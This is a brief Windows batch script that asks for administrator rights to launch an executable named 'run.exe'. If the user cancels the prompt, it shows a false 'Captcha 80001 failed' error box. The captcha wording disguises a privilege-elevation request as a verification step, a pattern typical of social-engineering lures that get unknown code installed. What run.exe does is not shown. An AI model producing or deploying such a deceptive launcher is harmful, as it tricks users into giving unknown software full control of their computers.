@echo off
:: Ask for admin privileges
powershell -Command "Start-Process 'run.exe' -Verb RunAs"
if %errorlevel% neq 0 (
    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Captcha 80001 failed: User cancelled', 'Error', 'OK', 'Error')"
)
